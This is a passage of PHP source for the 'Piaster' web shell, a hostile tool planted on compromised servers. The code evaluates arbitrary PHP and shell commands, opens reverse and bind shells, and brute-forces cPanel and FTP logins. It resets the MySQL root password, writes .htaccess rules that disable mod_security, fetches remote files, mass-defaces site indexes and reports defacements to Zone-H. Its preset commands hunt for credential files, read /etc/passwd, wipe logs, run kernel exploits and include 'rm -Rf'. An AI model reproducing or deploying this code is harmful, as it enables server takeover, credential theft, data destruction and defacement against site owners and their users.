case(oPp =='5'):{ sqlinj();}break;
case(oPp == '6'):{ ps5s();}break;
case(oPp == '7'):{ extr_i();}break;


case(isset($_REQUEST["evap"])):{
rs('cfed','141','22',$st='readonly');
$sd = stripcslashes($_POST['evac']);
@eval($sd);
echo "</textarea>";}break;

case(isset($_REQUEST["gotod"])):
{
rs('cmdm','141','22',$st='readonly');
$path =htmlspecialchars($_POST['goto']);
$dih = @opendir($path) or die("<br><b>Permision denied! Unable to open dir $path");
if(wdll_chf())echo wdll_cmdf('dir');else htmlspecialchars(htmlspecialchars(wdll_updir($dih, $path)));
echo "</textarea>";}break;

case(isset($_REQUEST["finds"])):
{$pathh =htmlspecialchars($_POST['goto']);
$fin = htmlspecialchars($_POST['fin']);echo "Find File = &nbsp;".$fin."&nbsp;&nbsp;Dir = &nbsp;".$path ;
rs('cmdm','141','22',$st='readonly');
$dih = @opendir($pathh) or die("<br><b>Permision denied! Unable to open dir $path");
echo wdll_nora($dih,$pathh,$fin);
echo "</textarea>";}break;
case (isset($_REQUEST["mvdi"])):{rs('cmdm','141','22',$st='readonly');
$cop = true;
$mvdir = htmlspecialchars($_POST['movd']);
$dst = htmlspecialchars($_POST['destd']);
if(!empty($_POST['rvm'])){$cop = false;}
md($mvdir,$dst,$cop);echo "</textarea>";
}break;

    
case(isset($_REQUEST["gip"])): 
{echo "<br>SQL INJECTION FOUNDER<br>";
    rs('cmdm','141','22',$st='readonly');
    echo sqlj_do($_REQUEST["ipp"]);
    echo "</textarea>";
    echo "<p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a></p>"; ft(); die;
}break;
case(isset($_REQUEST["gfil"]) || isset($_REQUEST['gfils'])|| isset($_REQUEST['show'])):
{echo "<form name=\"savf\" action=\"".$php."\"method=\"post\">";
rs('cfed','141','22');
 if($_GET['show']) {$pos = @base64_decode(htmlspecialchars($_REQUEST['show'])); 
 
 if(function_exists('file_get_contents'))
{echo @file_get_contents($pos);}
elseif(function_exists('file'))
{echo @file($pos);}
elseif(function_exists('fread')){$x5 = @fopen($pos,'rw');$dc = @fread($x5,@filesize($pos));@fclose($x5);}
else {rf();} echo "</textarea>";inp('hidden','50','goto',path);
inp('hidden','50','svdi',$pos,'','<br>');
sub('svff','Save',$pr='<br>');exit;}

elseif(isset($_REQUEST['gfils'])){$pos = $HTTP_POST_VARS['cfils'];sqlf($pos);}
 else {$pos = $HTTP_POST_VARS['cfil'];}

switch($_REQUEST['getm']){ 
case('1'):{{$x5 = @fopen($pos,'rw');$dc = @fread($x5,@filesize($pos));@fclose($x5);echo $dc;}}break;
case('2'):{echo rf();}break;
case('3'):{if(function_exists('file_get_contents')){echo @file_get_contents($pos);}}break;}

echo "</textarea>";
inp('hidden','50','goto',path);
inp('hidden','50','svdi',$pos,'','<br>');
sub('svff','Save',$pr='<br>');}break;
case(isset($_REQUEST['cmdr'])):{
rs('cmdm','141','22',$st='readonly');
$pos = $_POST['cmde'];
echo  wdll_cmdf($pos);
echo "</textarea>";}break;
case(isset($_REQUEST['aliA'])) :{
    $alis = $_REQUEST['alI'];
define('dir',$alis);
echo "Command: &nbsp;".$alis."<br>";
rs('cmdm','141','22',$st='readonly');
echo wdll_cmdf($alis);
echo "</textarea>";}break;
case(isset($_REQUEST['spots'])):{
rs('cmdm','141','22',$st='readonly');
ps();

echo "</textarea>";
echo "<p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a></p>"; ft(); die;}break;

case(isset($_REQUEST['crcf'])):{if(!curc())die("Curl Not Avilable on this Server Can.t complete opration!");else{
$prt=$_REQUEST['port'];
$us=$_REQUEST['uses'];
$pa=$_REQUEST['pass'];
$sit=$_REQUEST['site'];
$crt=$_REQUEST['crt'];
if($crt == ""){echo "\nERORR: Chois Crack Type Cpanel OR FTP ?\n";
echo "<a href=\"javascript: history.go(-1)\">Back</a>";die;} 
echo "Crack Type:&nbsp;".$_REQUEST['crt']."\n[~] Cracking Process Started, Please Wait ...\n";
rs('cmds','141','22',$st='readonly');
$us=explode("\n",$us);
$pa=explode("\n",$pa);
echo "Crack Type:&nbsp;".$_REQUEST['crt']."\n[~] Cracking Process Started, Please Wait ...\n";
if($sit == ""){$sit = "localhost";}
if($prt == ""){$prt = "2082";}
foreach ($us as $u){$usr = trim($u);
foreach ($pa as $p ){$pwd = trim($p);
if($crt == "FTP"){echo fc($sit,$usr,$pwd,$tl);}
if ($crt == "Cpanel"){echo cc($sit,$prt,$usr,$pwd,$tl);}}}
echo "\n[~] Cracking Process Done!\n";
echo "</textarea>";unset($crcf);}}break;

case(isset($_REQUEST['dhtc'])):{
$ctc = htmlspecialchars($_POST['htc']);
$clc = htmlspecialchars($_POST['mhtc']);
rs('cmds','141','22',$st='readonly');
switch($_REQUEST['htcc']){
case('ch'):{$hd = @fopen(".htaccess","w+");@fwrite($hd,$clc);if(@fclose($hd)){echo "[+] Htaccess Created!";}}break;
case('cpp'):{$hd = @fopen(".htaccess","w+");@fwrite($hd,"AddType application/x-httpd-php4 .php");if(@fclose($hd)){echo "[+] Htaccess Created!";}}break;
case('cpe'):{$hd = @fopen(".htaccess","w+");@fwrite($hd,"<FileMatch '^.*\.$ctc>\r\nSetHandler application/x-httpd-php\r\n</FilesMatch>");if(@fclose($hd)){echo "[+] Htaccess Created!";}}break;
case('cre'):{$hd = @fopen(".htaccess","w+");@fwrite($hd,"Options ExecCGI\r\nAddType application/x-httpd-cgi .$ctc\r\nAddHandler cgi-script .".$ctc);if(fclose($hd)){echo "[+] Htaccess Created!";}}break;
case('fis'):{$hd = @fopen(".htaccess","w+");@fwrite($hd,"<IfModule mode_security.c>\r\nSecFilterEngine Off\r\nSecFilterScanPOST Off\r\n</IfModule>");if(fclose($hd)){echo "[+] Htaccess Created!";}}break;
case('cpi'):{$hd = @fopen("php.ini","w+");@fwrite($hd,$clc);if(@fclose($hd)){echo "[+] PHP.ini Created!";}}break;}

echo "</textarea>";unset($dhtc);}break;
case(isset($_REQUEST['zhsd'])): {rs('cmds','141','18',$st='readonly');
if(!curc())die("Curl Not Avilable on this Server Can.t complete opration!");else{
$hnam = htmlspecialchars($_POST['hname']);
$htype = htmlspecialchars($_POST['htype']);
$hwhy =  htmlspecialchars($_POST['hwhy']);
$hsts =  htmlspecialchars($_POST['sts']);
$hdo= explode("\n", $hsts);  
foreach ($hdo as $uu){$sitss = trim($uu);
echo zhsr($hnam,$htype,$hwhy,$sitss);}
}echo "</textarea>";unset($zhsd);}break;

case (isset($_REQUEST["ext_si"])) : {
    rs('cmds','141','22',$st='readonly');
    extr_si();  
 echo "</textarea>"; echo "<br><br><a href=\"".$php."\">Home</a>|&nbsp;|<a href=\"javascript: history.go(-1)\">Back</a><br>";ft();exit();}break;

case (isset($_REQUEST['urlup'])):
{rs('cmds','141','22',$st='readonly');
$url =  htmlspecialchars($_POST['urlf']);
$file =  htmlspecialchars($_POST['localf']);
$pathf =  htmlspecialchars($_POST['pathf']);
if(fetchFilef($url,$pathf,$file)) {echo "[+]Uploaded file saved as ". path.'/'.$file;}else
{echo "[+] Check the directory permissions for (must be 777)!\nor \nCheck URL!";}
echo "</textarea>";unset($urlup);}break;

case(isset($_REQUEST['crypfl'])||isset($_REQUEST['crypo'])):
{rs('ccrt' ,'141','22',$st='');
if(isset($_REQUEST['crypo']))
$file=@fopen($_FILES['userfile']['tmp_name'],"r") or die ("[-]Error reading file!");
$meth=$_POST['crypt'];if ($meth=="1") {echo stripcslashes(md5(@fread($file,100000)));} elseif ($meth=="2") {echo stripcslashes(crypt(@fread($file,100000)));}
elseif ($meth=="3") {echo stripcslashes(sha1(@fread($file,100000)));}
elseif ($meth=="4") {echo stripcslashes(crc32(@fread($file,100000)));}
elseif ($meth=="5") {echo stripcslashes(urlencode(@fread($file,100000)));}
elseif ($meth=="6") {echo stripcslashes(urldecode(@fread($file,100000)));}
elseif ($meth=="7") {echo stripcslashes(@base64_encode(@fread($file,100000)));}
elseif ($meth=="8") {echo stripcslashes(@base64_decode(@fread($file,100000)));}
echo "</textarea><div align=left>";echo '<br><form enctype="multipart/form-data"  method="post"><b>File:<br><input name="userfile" type="file"><br><br><input type="submit" value="Crypt" name="crypo"><br><br><hr><input type=radio name=crypt value=1>md5();<br><hr><input type=radio name=crypt value=2>crypt();<br><hr><input type=radio name=crypt value=3>sha1();<br><hr><input type=radio name=crypt value=4>crc32();<br><hr><input type=radio name=crypt value=5>urlencode();<br><hr><input type=radio name=crypt value=6>urldecode();<br><hr><input type=radio name=crypt value=7>base64_encode();<br><hr><input type=radio name=crypt value=8>base64_decode();<br>';echo "<hr><div align =\"center\"><br><br><a href=\"javascript: history.go(-1)\">Back</a>";echo "<p align=\"center\"><a href=\"".$php."\">Home</a><br></p>";
exit;
}break;

case(oP == '8'):{ indexc();exit();}break;
case(oPp == '1'):{ vbsql();exit();}break;
case(oPp == '2'):{ backc();}break;
case(oPp == '4' || $_REQUEST['piasS']):{


if($win) {
	define('STDIN',@fopen("php://stdin","r"));
	$input = trim(@fgets(STDIN,256));
	$input = ereg_replace('\"', "\\\"", $input);
	$input = ereg_replace('\'', "\'", $input); 

	echo "| |<a href=\"".$php."\">Home</a></p>";
   if(wdll_chf()) wdll_cmdf("net stop mysql");
	if(wdll_chf()) wdll_cmdf('start /b C:\AppServ\MySQL\bin\mysqld-nt.exe --skip-grant-tables --user=root');
	if(wdll_chf()) wdll_cmdf("C:\AppServ\MySQL\bin\mysql -e \"update mysql.user set PASSWORD=PASSWORD('piaster') where user = 'root';\"");
	if(wdll_chf()) {wdll_cmdf("C:\AppServ\MySQL\bin\mysqladmin -u root shutdown"); 
    	echo '<br> Please wait ................................... Goodluck ...Win phpMyAdmin Hacked :: <br>USER: root & PASSWORD: piaster<br><br><br><p align="center"><a href="javascript: history.go(-1)">Back</a>';}else echo " I think function disable or Path: 'C:\AppServ\MySQL ' not found on this server edit Path..Bug only in AppServ about www.appservnetwork.com";
	sleep(3);
	if(wdll_chf()) wdll_cmdf("net start mysql");} 

if(!$win) {
    echo '<form action="#" method="post">';
    inp('input','20','dbu',$_REQUEST['dbu'],$ti='user',$pr='');
    inp('input','20','dbp',$_REQUEST['dbp'],$ti='password',$pr='');
    inp('input','20','dbh',$_REQUEST['dbh'],$ti='host',$pr='');
    sub('piasS','GO',$pr='');
    echo '</form>';


if(isset($_REQUEST['piasS'])){
    
$dbu = $_REQUEST['dbu'];
$dbp = $_REQUEST['dbp'];
$dbh = $_REQUEST['dbh']? $_REQUEST['dbh'] : 'localhost';

$conn = @mysql_connect($dbh, $dbu, $dbp);
$select = @mysql_select_db('mysql', $conn);
if (!$select) {
echo @mysql_error();}

$t1 = "UPDATE mysql.user set PASSWORD=PASSWORD('piaster') where user = 'root';";
$go1 = @mysql_query( $t1 , $conn);

if($go1){echo '<center><br>Goodluck ... Lunix phpMyAdmin Hacked :: Now Wait Until Mysql Restart and Come back with USER: root & PASSWORD: piaster<br><br><br><p align="center"><a href="javascript: history.go(-1)">Back</a></p></center>';
echo "| |<a href=\"".$php."\">Home</a>";}
}}exit();}break;

case(isset($_REQUEST['vbsq'])):{ vb_opt();exit();}break;

case(oP == 6):{
//echo "<hr color= #993333>";
rs('cmds','120','20',$st='readonly');
if(wdll_chf()){ if(!$win){echo wdll_cmdf('ls -la');}else echo wdll_cmdf('dir');}else
{$dih = @opendir(path) or die("<br><b>Permision denied! Unable to open dir $path");
wdll_updir($dih, path);}
echo "</textarea>"; }break;
default:{echo "<font color = orange>
Hello <br>
I hope you will find useful tool to perform your job properly<br>
Also heal myself if your use of it in harm to people <br>
Always remember<br>
Easy Come Easy Go.<br>
Piaster 2011 v1.6<br>
";}//---------------------------------
}
echo " <table>";

if($_REQUEST['wbp']){bbc($_REQUEST['wbcp']);}
if($_REQUEST['lbg']){bbc($_REQUEST['lbcp']);}
if($_REQUEST['bpg'] ){bbc($_REQUEST['bcpo'],$_REQUEST['bcip']);}

echo "<br>" ;sl(); 

echo "<br><br>";

echo "<table><tr><td>";
//echo "<hr color= #993333>";
cm_ge(); echo "</td><td>";
//echo "<hr color= #993333>";
cm_gee();echo "</td></tr></table>";echo "<hr color= #993333>";
if (oP == '13' ||  !empty($_POST['evac'])) {echo eva();}
else db_lg() ;echo "<br>";urlp();echo "<hr color = #993333><br>"; movdr();
echo "<hr color = #993333></div>";
echo "</table>"; 
function mailr_s(){
echo "<form name=\"savf\" action=\"".$php."\"method=\"post\">";
inp('text','30','mnam',$_REQUEST['mnam'],'Your name: ','');
inp('text','30','mmail',$_REQUEST['mmail'],'Your e-mail: ','');
inp('text','30','mito',$_REQUEST['mito'],'To: ','');
inp('text','30','msubj',$_REQUEST['msubj'],'Subject: ','<br>');
are('mmsg',$_REQUEST['mmsg'],'80','8',$st ='',$pr ='<br><br><br><br>'); 
sub('mSendm','Send');}
function sear(){
echo "<br><br><table bgcolor=black border = 1><tr><td><form action=\"".$php."\"method=\"post\">";
echo 'Path<br>';
inp('text','63','serdir',path,'','<br>');
echo '<br>';
echo 'Search DIR<br>';
inp('text','32','sedir','include','','<br>');
inp('radio','10','sea','cedr','Directory only','<br>');
echo '<br><div align = left>';
echo '<br>Key word';
are('searcc','','60','5',$pr ='<br>',$id='');
echo '<br>';
inp('radio','10','sea','cepr','Preg_Match &nbsp; (Regular expressions)(into file)','<br>');
inp('radio','10','sea','cewo','words only &nbsp; (into file)','<br>');
inp('radio','10','sea','cefn','File Name &nbsp; (same key word ex: config.php)','<br>');
inp('radio','10','sea','cefi','File Name &nbsp; (include yo key word)(min char = 3)','<br>');//
inp('radio','10','sea','cefm','File Mode &nbsp; (like 666 ,777 ...etc)','<br>');
inp('radio','10','sea','ceft','File Type &nbsp; (like php,txt ...etc)','<br><br>');
echo '<div align = center>';
sub('search','Search');
echo '</form></div></ts></tr></table>';
echo "<br><a href=\"".$php."\">Home</a><p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a></p>"; ft(); die;}

function hashw()
{ $crtf = $_POST['crrt'];echo "<form  action=\"".$php."\"method=\"post\">";
are('crrt',stripcslashes($crtf),'80','8','<br>',$id='');echo "<br><br><br><table width = \"100\"  border=1 bgcolor =\"000000\" ><tr>";echo '<td>md5:</td><td>';
inp('text','80','cc',stripcslashes(@md5($crtf)),'','<br>');echo "</td></tr>";echo '<td>crypt:</td><td>';
inp('text','80','cc',stripcslashes(@crypt($crtf)),'','<br>');echo "</td></tr>";echo '<td>sha1:</td><td>';
inp('text','80','cc',stripcslashes(@sha1($crtf)),'','<br>'); echo "</td></tr>";echo '<td>crc32:</td><td>';
inp('text','80','cc',stripcslashes(@crc32($crtf)),'','<br>'); echo "</td></tr>";echo '<td>urlencode:</td><td>';
inp('text','80','cc',stripcslashes(@urlencode($crtf)),'','<br>'); echo "</td></tr>";echo '<td>urldecode:</td><td>';
inp('text','80','cc',stripcslashes(@urldecode($crtf)),'','<br>');echo "</td></tr>";echo '<td>base64_encode:</td><td>';
inp('text','80','cc',stripcslashes(@base64_encode($crtf)),'','<br>'); echo '</td>';echo "</td></tr>";echo '<td>base64_decode:</td><td>';
inp('text','80','cc',stripcslashes(@base64_decode($_POST['crrt'])),'','<br>'); echo "</td></tr>";echo '</tr>';echo '<br><br>';
echo '</td>';echo "</td></tr>";echo '<td>dec2hex:</td><td>';
$c = strlen($crtf); for($i=0;$i<$c;$i++) { $hex = dechex(ord($crtf[$i])); if ($crtf[$i] == "&") 
{echo $crtf[$i];} elseif ($crtf[$i] != "\\") {echo "%".$hex;}}
echo '</table>';
sub('crtty','Crypt','');echo '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';sub('crypfl','Crypt File');echo '<br><br>';
echo "<a href=\"javascript: history.go(-1)\">Back</a></div><hr>";echo "<p align=\"center\"><a href=\"".$php."\">Home</a><br></p>";}

function extr_i(){
echo "<form  action=\"".$php."\"method=\"post\">";
inp('text','50','sqtid','','IP/HOST:');
sub('ext_si','Extract!','<br>');
echo "</form>";  
}
function indexc()
{$xq = 'UPDATE "dbname".template name SET template name = "index code" WHERE title = "field title"'; 
echo "<form action=\"".$php."\" method=\"post\">
<div align =\"center\"><b>Index Code</b>";
are('coded','Post your code here','50','20','<br>');
echo '<div align=left>';
echo "<b>File Options</b><br><hr color=black>";
inp('text','40','masdr',path,'Path');echo '&nbsp;&nbsp;';inp('text','20','skid','Dir name','Skip Dir');echo "<br>"; 
inp('radio','10','msi','msfi','Just indexes','<br>');
inp('radio','10','msi','msfa','all files','<br>');
inp('radio','10','msi','msfr','Remove all without indexes');
echo "<hr color=black><b>DataBase options</b><br>";

echo "<br>";
inp('radio','10','msi','msvb','VB','<br>');
inp('radio','10','msi','msbb','MyBB','<br>');
inp('radio','10','msi','msin','Infinty','<br>');
inp('radio','10','msi','mswp','WordPress','<br>');
inp('radio','10','msi','msjo','Jomla','<br>');
inp('radio','10','msi','msrd','Remove DB!','<br>');
inp('radio','10','msi','msot','Other | index code = $coded','<br>');
inp('text','100','msqur',$xq,'Query:');echo "<br><br>";
inp('text','15','sqdbn',$n,'DBname:');
inp('text','15','sqlog',$u,'DBuser:');
inp('text','15','sqpwd',$p,'DB_PWD:');
inp('text','13','sqsrv','localhost','HOST:');
inp('text','13','sqprt','3306','PORT:');

echo "<hr color=black><br><br><div align =\"center\">";
sub('massa','Mass Index!','<br>');
echo "</form>";
echo "<a href=\"".$php."\">Home</a><br><br>";exit;}

function sqlinj(){
echo "<center>FIND SQL INJECTION ON OTHER REMOTE SERVER <BR>"; 
echo "<form name=\"site\" action=\"".$php."\"method=\"post\">";
inp('text','20','ipp','',' IP ','<br><br>');
sub('gip','&nbsp;Find SQL Inj','<br>');
echo "</form>";
}
function ccf(){
$wrdlist= "1234556 \n987654321\n963852741\n321654\n987654321\n963741\n951753\n852654\n987321\n321987951753";
if(wdll_chf()){$userlist = wdll_cmdf('ls /var/mail');}else $userlist ="users";
echo "<form  action=\"".$php."\"method=\"post\"><br><br>";
$loca = $_SERVER['SERVER_NAME'];
inp('text','30','site',$loca,'HOST/IP');
inp('text','5','port','2082','Port','<br>');

if(!empty($_REQUEST['uses'])){ $userlist = $_REQUEST['uses'];}
echo "<table><tr><td>";
are('uses',$userlist,'10','20',$pr ='');echo "</td><td>";
if(!empty($_REQUEST['pass'])){$wrdlist = $_REQUEST['pass'];}echo "</td><td>";
echo "<textarea id='passw' name='pass' cols='10'rows='20' onselect='cp()' onchange='cp()' onkeydown='cp()' onkeyup='cp()' onchange='cp()'>".$wrdlist."</textarea>";
echo "</td></tr></table>";
echo "<br>
<b>Password Number : <span id='pn'>0<br></span>
<span><font color=orange><b>Split The Password List By:</font></span><br>
<input name='textml' id='spl' type='text' value=',' size='5'/>
<input type='button' onclick='psplit()' value='Split'>";
echo "<br><br>";
inp('radio','10','crt','cp','Cpanel [2082]');
inp('radio','10','crt','FTP','FTP [21]','<br>');
echo "<br>";
sub('crcf','Crack');
echo "</form>";
echo "<br><a href=\"".$php."\">Home</a><br><br>";
?>
<body onload="cp">
<script type="text/javascript">
	
	window.onload = pchange;
	var xy = false;	
    	function psplit(){
		var yx = document.getElementById("passw").value;
		var yz = document.getElementById("spl").value;
		var nora=new Array();
		nora = yx.split(yz);
		document.getElementById("passw").value="";
		var i;
		for(i=0;i<nora.length;i++){
			document.getElementById("passw").value += nora[i]+"\n";}
		cp();}
	function cp(){
		var etext = document.getElementById("passw").value;
		var nora=new Array(); 
		nora = etext.split("\n");
		document.getElementById("pn").innerHTML=nora.length+"<br />";
		if(!xy && nora.length > 50000){
			alert('If passwords list More Than 50000 passwords This May Hang The Server');
			xy = true;}}</script>
<?php
exit();}

function backc(){        
echo "<form  action=\"".$php."\"method=\"post\">";     
inp('text','20','bcip',$_SERVER['REMOTE_ADDR'],'IP:');
inp('text','10','bcpo','1985','Port');
sub('bpg','Connect!','<br><br>');
echo 'Lunix Bind Port <br>';
inp('text','10','lbcp','1985','Port');
sub('lbg','Connect!','<br><br>');
echo 'Win Bind Port<br>';
inp('text','10','wbcp','1985','Port');
sub('wbp','Connect!');
echo "</form>";

echo "<p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a><center><br></p>";}
function urlp(){        
echo "<form  action=\"".$php."\"method=\"post\">";     
inp('text','50','urlf','http://www.','URL:');
inp('text','50','pathf',path,'Path');
inp('text','10','localf','wdll.zip','Save as');
sub('urlup','Upload!');
echo "</form>";}

function ps5s(){
echo "<form  action=\"".$php."\"method=\"post\">";
inp('text','30','hot','IP/Domain');
inp('text','8','spot','1','FROM');
inp('text','8','epot','100','TO');
sub('spots','Scan');
echo "</form>";
}
function ch()
{
echo "<select name=ch>
<option value=cm>CHMOD</option>
<option value=co>CHOWN</option>
<option value=cg>CHGRP</option>
<option value=cu>Unlink</option>
</select>";inp('text','44','cfx',path);inp('text','8','cfy','0666');sub('chfl','Ok');}

function movdr(){
echo "<form  action=\"".$php."\"method=\"post\">";
inp('checkbox','','rvm','remov','Remove dir after copy');
inp('text','50','movd',path,'FROM');inp('text','47','destd',path,'TO');
sub('mvdi','Move');echo "</div>";
echo "</form>";}

function eva()
{echo "<form  action=\"".$php."\"method=\"post\">";
$valo = '//unlink G5.php';
are('evac',$valo,'125','5',$st ='',$pr ='<br><br><br><br>');
sub('evap','Run PHP Code',$pr='<br>');echo "</form>";}

function sk_ju()
{inp('checkbox','50','Ski','Ski','Skip');
inp('checkbox','50','Jum','Jum','Jump');
inp('text','20','askid','uploads','DIR');}

function cm_ge()
{$aliss = '';
$aliss = dir;
echo "<form method=\"POST\" action=\"".$php."\" enctype=\"multipart/form-data\">";
echo "<table dir =left border=1 bgcolor =\"000000\" ><tr><td>Execute</td><td>";
inp('text','55','cmde',$aliss,'');sub('cmdr','CMD',$pr='<br>');echo "</td></tr>";
echo "<tr><td> Get File</td><td>";
echo"<select size=\"1\" name=\"getm\" title=\"FileS Action\" >

<option value=\"2\">Mode [0]</option>
<option value=\"1\">Mode [1]</option>
<option value=\"3\">Mode [2]</option>

</select>";
if(isset($HTTP_POST_VARS['cfil']))$oop = $_POST['cfil'];else $oop = path;
inp('text','42','cfil',$oop,'');sub('gfil','&nbsp;Get ','<br>');echo "</td></tr>";

echo "<tr><td>Go Dir</td><td>";
inp('text','55','goto',path,'');sub('gotod',' Go &nbsp;','<br>');echo "</td></tr>";
echo "<tr><td>Locate</td><td>";
inp('text','55','fin','config.php','');sub('find','Find');echo "</td></tr>";

echo "<tr><td>Upload</td><td>";
inp('hidden','55','MAX_FILE_SIZE',$umf,'');
echo "<input type=\"file\" name=\"dfill\" accept=\"*/*\" size=\"36\">";
sub('upcom','&nbsp;&nbsp;Up&nbsp;','<br>');echo "</td></tr></table>";}

function cm_gee()
{echo "<form method=\"POST\" action=\"".$php."\" >";
echo "<table dir =right border=1 bgcolor =\"000000\" ><tr><td>MK Dir</td><td>";
inp('text','55','mKd',path,'');sub('mkD','&nbsp;MKD ',$pr='<br>');echo "</td></tr>";
echo "<tr><td>MK File</td><td>";
inp('text','55','mKf',path,'');sub('mkF','&nbsp;MKF ','<br>');echo "</td></tr>";

echo "<tr><td>Download</td><td>";
inp('text','55','dWn',path,'');sub('dWNf','down','<br>');echo "</td></tr>";
echo "<tr><td>File options</td><td>";
ch();echo "</td></tr>";

echo "<tr><td>Execute</td><td>";
alias();
echo "</td></tr>

</table>";}

function zh()
{echo "<br><br><form  action=\"".$php."\"method=\"post\">";
echo "Defacer?<br>";
inp('text','30','hname','w.dll','','<br>');
echo "Hacking Mode?<br><select name='htype'><option >--------SELECT--------</option><option value='1'>known vulnerability (i.e. unpatched system)</option><option value='2' >undisclosed (new) vulnerability</option><option value='3' >configuration / admin. mistake</option><option value='4' >brute force attack</option><option value='5' >social engineering</option><option value='6' >Web Server intrusion</option><option value='7' >Web Server external module intrusion</option><option value='8' >Mail Server intrusion</option><option value='9' >FTP Server intrusion</option><option value='10' >SSH Server intrusion</option><option value='11' >Telnet Server intrusion</option><option value='12' >RPC Server intrusion</option><option value='13' >Shares misconfiguration</option><option value='14' >Other Server intrusion</option><option value='15' >SQL Injection</option><option value='16' >URL Poisoning</option><option value='17' >File Inclusion</option><option value='18' >Other Web Application bug</option><option value='19' >Remote administrative panel access through bruteforcing</option><option value='20' >Remote administrative panel access through password guessing</option><option value='21' >Remote administrative panel access through social engineering</option><option value='22' >Attack against the administrator/user (password stealing/sniffing)</option><option value='23' >Access credentials through Man In the Middle attack</option><option value='24' >Remote service password guessing</option><option value='25' >Remote service password bruteforce</option><option value='26' >Rerouting after attacking the Firewall</option><option value='27' >Rerouting after attacking the Router</option><option value='28' >DNS attack through social engineering</option><option value='29' >DNS attack through cache poisoning</option><option value='30' >Not available</option></select></p>";
echo "Hacking Reason?<br><select name='hwhy'><option >--------SELECT--------</option><option value='1' >Heh...just for fun!</option><option value='2' >Revenge against that website</option><option value='3' >Political reasons</option><option value='4' >As a challenge</option><option value='5' >I just want to be the best defacer</option><option value='6' >Patriotism</option><option value='7' >Not available</option></select>";
echo "<br>";
are('sts',@getenv("SERVER_NAME"),'30','10',$pr ='');
echo '<br>';
sub('zhsd','Zone-H!');echo "</form>";
echo "<br><br><a href=\"".$php."\">Home</a><br><br>";exit;}

function htc(){
echo"<br><br><br>
<form name=\"site\" action=\"".$php."\"method=\"post\"><select size=\"1\" name=\"htcc\" title=\"FileS Action\" ><option>Select</option><option value=\"ch\">Create htaccess</option><option value=\"cpi\">Create php.ini</option><option value=\"cpe\">Change PHP Extension </option><option value=\"cre\">Change Perl Extension</option><option value=\"cpp\">Change PHP5 to PHP4</option><option value=\"fis\">Kill(Forrbidden + Error 500)</option></select>";
inp('text','5','htc','wdll','TO');
echo '<br>';
are('mhtc','Code here','40','5',$pr ='');
sub('dhtc','Make!');
echo "</form><br>";
echo "<a href=\"javascript: history.go(-1)\">Back</a><br><br>";exit;}

function alias()
{echo "<form name=\"site\" action=\"".$php."\"method=\"post\"><select size=\"1\" name=\"alI\" title=\"Find\"><option >Select</option><option >________current dir________________________</option><option value='find . -type f -perm -04000 -ls'>suid files <=</option><option value='find . -type f -perm -02000 -ls'>sgid files <=</option><option value='find . -type f -name config.php'>config.php files <=</option><option value='find . -type f -name 'config*''>config* files <=</option><option value='find . -type f -perm -2 -ls'>find all writable files <= </option><option value='find . -type d -perm -2 -ls'>find all writable directories <=</option><option value='find . -perm -2 -ls'>find all writable directories and files <=</option><option value='find . -type f -name service.pwd'>find service.pwd files <=</option><option value='find . -type f -name .htpasswd'>find .htpasswd files <=</option><option value='find . -type f -name .bash_history'>find .bash_history files <=</option><option value='find . -type f -name .mysql_history'>find .mysql_history files <=</option><option value='find . -type f -name .fetchmailrc'>find .fetchmailrc files <=</option><option >________Out dir____________________________</option><option value='find / -type f -perm -04000 -ls'>suid files =></option><option value='find / -type f -perm -02000 -ls'>sgid files =></option><option value='find / -type f -name config.php'>config.php files =></option><option value='find / -type f -name 'config*''> config* files =></option><option value='find / -type f -perm -2 -ls'>find all writable files => </option><option value='find /  -type d -perm -2 -ls'>find all writable directories =></option><option value='find / -perm -2 -ls'>find all writable directories and files => </option><option value='find / -type f -name service.pwd'>find all service.pwd files =></option><option value='find / -type f -name .htpasswd'>find all .htpasswd files =></option><option value='find / -type f -name .bash_history'>find all .bash_history files =></option><option value='find / -type f -name .mysql_history'>find all .mysql_history files =></option><option value='find / -type f -name .fetchmailrc'>'find all .fetchmailrc files =></option><option >___________________ _______________________</option><option value='lsattr -va'>list file attributes on a Linux second extended file Sys</option><option value='netstat -an '>show opened ports</option><option value='ls -la'>Show files </option><option value='dir'>Show files Win</option><option >__________Useful Commands _________________</option><OPTION VALUE='uname -a'>Kernel version<OPTION VALUE='w'>Logged in users<OPTION VALUE='lastlog'>Last to connect<OPTION VALUE='find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null'>Suid bins<option VALUE='cut -d: -f1,2,3 /etc/passwd | grep ::'>Users<option VALUE='find /etc/ -type f -perm -o+w 2> /dev/null'>Write in /etc/?<option VALUE='which wget curl w3m lynx'>Downloaders?<option VALUE='cat /proc/version /proc/cpuinfo'>CPUINFO<option VALUE='netstat -atup | grep IST'>Open ports<option VALUE='locate gcc'>gcc installed?<option VALUE='rm -Rf'>Format box (DANGEROUS)<option VALUE='gcc zap2.c -o zap2'>WIPELOGS PT2<option VALUE='./zap2'>WIPELOGS PT3<option VALUE='./k3 1'>Kernel attack (Krad.c) PT2 (L1)<option VALUE='./k3 2'>Kernel attack (Krad.c) PT2 (L2)<option VALUE='./k3 3'>Kernel attack (Krad.c) PT2 (L3)<option VALUE='./k3 4'>Kernel attack (Krad.c) PT2 (L4)<option VALUE='./k3 5'>Kernel attack (Krad.c) PT2 (L5)<option value='cat /etc/passwd'>/etc/passwd</option><option value='cat /var/cpanel/accounting.log'>/var/cpanel/accounting.log</option><option value='cat /etc/syslog.conf'>/etc/syslog.conf</option><option value='cat /etc/hosts'>/etc/hosts</option><option value='cat /etc/named.conf'>/etc/named.conf</option><option value='cat /etc/httpd/conf/httpd.conf'>/etc/httpd/conf/httpd.conf</option></select>";
sub('aliA','Run  ');
echo "</form>";
}

function db_lg()
{
echo $query=$_REQUEST['sqquery'];
echo  "<form  action=\"".$php."\" method=\"post\">";
echo "<br><div align=center>";
$n = 'mysql';
$u = 'User Name';
$p = 'Password';
if(!empty($_POST['sqdbn'])){$n = $db;}
if(!empty($_POST['sqlog'])){$u = $user;}
if(!empty($_POST['sqpwd'])){$p = $pass;}

echo "<select name=sqlty>

<option valut=MySQL  onClick='document.client.sqlserv.disabled = false;' ";
if ($_REQUEST['sqlty']=='MySQL')echo 'selected';echo ">MySQL</option>

<option valut=MSSQL onClick='document.client.sqlserv.disabled = false;' ";
if ($_REQUEST['sqlty']=='MSSQL')echo 'selected';
